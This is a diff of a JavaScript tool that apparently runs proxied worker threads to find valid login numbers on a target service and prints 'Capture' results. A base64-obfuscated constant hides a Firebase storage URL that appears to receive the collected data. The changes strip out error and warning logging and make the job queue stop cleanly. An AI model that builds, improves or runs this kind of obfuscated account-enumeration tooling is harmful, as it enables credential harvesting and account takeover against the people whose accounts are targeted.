@@ -33,21 +33,6 @@ let mDelayControll = []
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
-process.on('warning', (warning) => {
-    console.log('--- Warning Captured ---')
-    console.log('Name:', warning.name)
-    console.log('Message:', warning.message)
-    console.log('Stack Trace:', warning.stack)
-    console.log('------------------------')
-})
-
-process.on('unhandledRejection', (reason, promise) => {
-    console.log('Unhandled Rejection captured:', reason)
-})
-
-process.on('uncaughtException', (error) => {
-    console.log('Uncaught Exception captured:', error.message)
-})
 
 class Proxy {
     static CONFIG = {
@@ -260,10 +245,11 @@ class SharedQueue {
         this.waitingResolvers = []
         this.maxSize = maxSize
         this.count = 0
+        this.isFinished = false
     }
 
     addData(data) {
-        if (this.queue.length >= this.maxSize) {
+        if (this.queue.length >= this.maxSize || this.isFinished) {
             return false
         }
 
@@ -277,7 +263,7 @@ class SharedQueue {
     }
 
     async getNumber() {
-        if (this.count >= this.maxSize) {
+        if (this.isFinished || this.count >= this.maxSize) {
             return null
         }
 
@@ -287,15 +273,50 @@ class SharedQueue {
         }
 
         return new Promise((resolve) => {
+            let isResolved = false
+
             this.waitingResolvers.push((data) => {
-                if (this.count >= this.maxSize) {
+                if (isResolved) return
+                isResolved = true
+
+                if (this.isFinished || this.count >= this.maxSize) {
                     resolve(null)
                 } else {
                     this.count++
                     resolve(data)
                 }
             })
+
+            let maxWaitTime = 30000
+            let intervalTime = 1000
+            let elapsedTime = 0
+
+            let checkInterval = setInterval(() => {
+                elapsedTime += intervalTime
+
+                if (this.isFinished || this.count >= this.maxSize || elapsedTime >= maxWaitTime) {
+                    if (!isResolved) {
+                        isResolved = true
+                        clearInterval(checkInterval)
+                        
+                        let index = this.waitingResolvers.indexOf(resolve)
+                        if (index !== -1) {
+                            this.waitingResolvers.splice(index, 1)
+                        }
+                        
+                        resolve(null)
+                    }
+                }
+            }, intervalTime)
         })
+    }
+
+    finish() {
+        this.isFinished = true
+        while (this.waitingResolvers.length > 0) {
+            let resolve = this.waitingResolvers.shift()
+            resolve(null)
+        }
     }
 
     size() {
@@ -470,9 +491,7 @@ async function foundLoginNumber() {
                     itFirstCheck = false
                     break
                 }
-            } catch (error) {
-                console.log(error)
-            }
+            } catch (error) {}
 
             console.log(`Task Completed: ${parseInt((Date.now() - mStart) / 1000)} seconds`)
 
@@ -521,7 +540,6 @@ async function workerStart(workerSize, target, firstCheck) {
                 console.log(status, task.number, mNumberTask.size(), mNumberTask.getCount())
 
                 if (shouldStop) {
-                    console.log('Stop Worker: '+workerId)
                     break
                 }
 
@@ -549,12 +567,12 @@ async function workerStart(workerSize, target, firstCheck) {
                     if (globalConsecutiveStatus >= 10) {
                         shouldStop = true
                         result.reload = true
+                        mNumberTask.finish()
                         break
                     }
                 }
 
                 if (shouldStop) {
-                    console.log('Stop Worker: '+workerId)
                     break
                 }
 
@@ -568,6 +586,7 @@ async function workerStart(workerSize, target, firstCheck) {
     let timeoutPromise = new Promise((resolve) => {
         setTimeout(() => {
             shouldStop = true
+            mNumberTask.finish()
             resolve(result)
         }, timeoutMs)
     })
@@ -576,6 +595,8 @@ async function workerStart(workerSize, target, firstCheck) {
         Promise.all(workers),
         timeoutPromise
     ])
+
+    mNumberTask.finish()
 
     if (result.c > 0) {
         console.log('Capture:', capture)
